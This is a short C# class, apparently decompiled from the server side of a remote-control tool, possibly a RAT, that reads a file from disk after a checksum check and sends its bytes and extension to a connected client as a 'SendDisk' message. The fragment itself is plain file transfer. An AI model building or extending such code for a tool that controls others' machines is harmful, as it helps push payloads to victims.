using System.IO;
using Leb128;
using Server.Connectings;
using Server.Helper;

namespace Server.Messages;

internal class HandlerSendDiskGet
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (Methods.GetChecksum(text) == (string)objects[2])
		{
			byte[] data = LEB128.Write(new object[3]
			{
				"SendDisk",
				Path.GetExtension(text),
				File.ReadAllBytes(text)
			});
			client.Send(data);
		}
	}
}
